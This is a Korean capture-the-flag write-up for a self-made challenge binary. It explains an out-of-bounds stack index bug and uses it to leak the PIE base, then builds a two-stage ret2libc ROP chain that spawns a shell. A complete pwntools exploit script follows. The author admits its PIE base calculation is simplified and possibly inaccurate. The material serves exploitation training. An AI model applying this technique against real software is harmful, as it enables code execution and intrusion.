challenge 문제제작 라이트업
===============

## 0) 보호기법 확인

```
checksec --file=challenge

* RELRO: **Full RELRO**
* Stack Canary: **No canary**
* NX: **NX enabled**
* PIE: **PIE enabled**
```

GOT overwrite는 Full RELRO로 막혀 있으므로 불가. 대신 **OOB read**로 **PIE base**를 누출하고, **OOB write**로 **saved RIP**을 덮어 **ROP** 수행.

## 1) 취약점 개요

`vuln()`에는 `uint64_t arr[8]`가 스택에 있고, `read/write`에서 **인덱스 경계검사 없음**.

* `read idx` → 임의 인덱스 읽기: **OOB read**
* `write idx value` → 임의 인덱스 쓰기: **OOB write**

일반적으로 스택 프레임: `[arr(0..7)] [saved RBP] [saved RIP] ...`
따라서 `idx >= 8` 또는 음수 인덱스 등을 이용해 **저장된 RBP/RIP 영역에 접근** 가능.

## 2) PIE 베이스 누출 (OOB read)

* `arr[k]`에서 `k`를 크게 주면(예: 10, 11 등) 스택의 상위 슬롯(저장된 RBP, 그 위의 **저장된 RIP**)이 노출.
* 출력되는 `saved RIP` 값은 `main` 또는 `vuln` 내부의 **PIE 주소**.
* `PIE_base = saved_RIP - offset_to_return_site`

  * offset은 디스어셈/ROPgadget로 바이너리 내 심볼/가젯 위치를 보면 계산 가능.
  * pwntools의 `ELF("./challenge", checksec=False)`와 `ROP()`를 사용해 **가젯 오프셋**을 구하고, 누출한 PIE 베이스로 주소 복원.

## 3) 1단계 ROP: libc 누출

NX가 켜져 있으므로 쉘코드는 불가 → **ret2libc** 필요.
libc 베이스를 얻기 위해서

1. **`pop rdi; ret`** (PIE 내부 가젯)로 인자 세팅.
2. **`puts@plt(puts@got)`** 호출 → `puts` 실제 libc 주소 누출.
3. **`main` (또는 `vuln`)으로 복귀** → 2단계 ROP를 다시 넣을 기회 확보.

체인

```
[... overwrite saved RIP with]
pop_rdi_ret
&puts@got (PIE base + off)
puts@plt   (PIE base + off)
main       (PIE base + off)
```

이 체인을 저장된 RIP 위치에 덮어쓰기 위해, `write idx value`로 **8바이트 단위로** 차례대로 쓰면 된다.

## 4) 2단계 ROP: system("/bin/sh")

1단계에서 받은 `puts` 누출로 `libc_base = leaked_puts - libc.sym['puts']` 계산.
이후

* `system = libc_base + libc.sym['system']`
* `bin_sh = libc_base + next(libc.search(b"/bin/sh"))`

체인

```
ret                 (정렬용)
pop_rdi_ret
bin_sh
system
```

## 5) 플래그 획득

체인 성공 시 쉘이 떠서 cat flag.txt

---

## 익스플로잇 코드



```python
# exploit.py
from pwn import *

context.binary = ELF('./challenge', checksec=False)
elf = context.binary

def start():
    return process('./challenge')

p = start()

def read_idx(i):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx? ', str(i).encode())
    line = p.recvline_regex(br"arr\[\-?\d+\] = 0x[0-9a-f]+")
    val = int(line.strip().split(b'=')[1], 16)
    return val

def write_idx(i, val):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx? ', str(i).encode())
    p.sendlineafter(b'> ', hex(val).encode())
    p.recvuntil(b"ok")

# 1) OOB read로 saved RIP 누출
saved_rbp = read_idx(8)
saved_rip = read_idx(9)
log.info(f"saved_rbp = 0x{saved_rbp:016x}")
log.info(f"saved_rip = 0x{saved_rip:016x}")

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi','ret']).address

# PIE base 대략화: saved_rip가 main의 리턴 근처라고 가정하고, 바이너리에서 main의 오프셋을 가져와 정렬
pie_base = saved_rip - elf.symbols['vuln'] 
log.info(f"PIE base (approx) = 0x{pie_base:016x}")

def A(off): return pie_base + off

puts_plt = A(elf.plt['puts'])
puts_got = A(elf.got['puts'])
main_addr = A(elf.symbols['main'])
pop_rdi_abs = A(pop_rdi)

# 2) 1단계 ROP: puts@plt(puts@got) → main
payload_chain = [
    pop_rdi_abs,
    puts_got,
    puts_plt,
    main_addr
]

# 스택 상에서 saved RIP 인덱스(9)에 맞춰 연속으로 써 넣음
start_idx = 9
for i, q in enumerate(payload_chain):
    write_idx(start_idx + i, q)

# 트리거: 메뉴에서 exit 선택으로 vuln 리턴 유도
p.sendlineafter(b'> ', b'3')

# 누출 수신
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"leaked puts = 0x{leaked:016x}")

# libc 로드 (시스템 환경 libc 사용 시)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
ret_sled = pop_rdi_abs + 1  

log.info(f"libc base = 0x{libc_base:016x}")
log.info(f"system    = 0x{system:016x}")
log.info(f"/bin/sh   = 0x{binsh:016x}")

# 3) 2단계 ROP: [ret](정렬용) → pop rdi; ret → binsh → system
payload_chain2 = [
    ret_sled,   
    pop_rdi_abs,
    binsh,
    system
]

# 다시 vuln으로 돌아왔으니 동일 절차로 RIP 덮기
for i, q in enumerate(payload_chain2):
    write_idx(start_idx + i, q)

p.sendlineafter(b'> ', b'3')
p.interactive()  # 쉘
```

주의: 해당 코드에서 `pie_base` 계산 부분은 **데모용**으로 단순화되어 있다.    

실제 익스에서는 `saved_rip`이 가리키는 정확한 오프셋을 디버거로 확인해서 `pie_base = saved_rip - <그 오프셋>`으로 안정적으로 구해야 한다. 또는 첫 단계에서 굳이 PIE base를 쓰지 않고 `plt/got` 상대 오프셋만으로 libc 누출 후, 두 번째 단계에서 `ROP(ELF).find_gadget`의 **오프셋** + `pie_base`로 절대 주소를 산출하는 방법을 사용할 수도 있다.
